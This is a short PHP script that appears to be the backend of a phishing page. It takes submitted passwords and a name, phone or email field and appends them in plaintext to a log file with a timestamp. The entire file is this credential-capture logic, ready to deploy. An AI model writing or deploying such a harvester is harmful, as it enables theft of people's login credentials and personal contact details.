<?php
if($_SERVER["REQUEST_METHOD"]=="POST"){
$password=$_POST["password"];
$name=$_POST["name"];
$file=fopen("logs.txt","a");
if(fwrite($file,"***** new log on ".Date("d/M/y - h:m:s")."\r password : ".$password."\n namePhoneOrEmail:".$name."\r****\n\n\n")){
  echo "done";
}
fclose($file);
}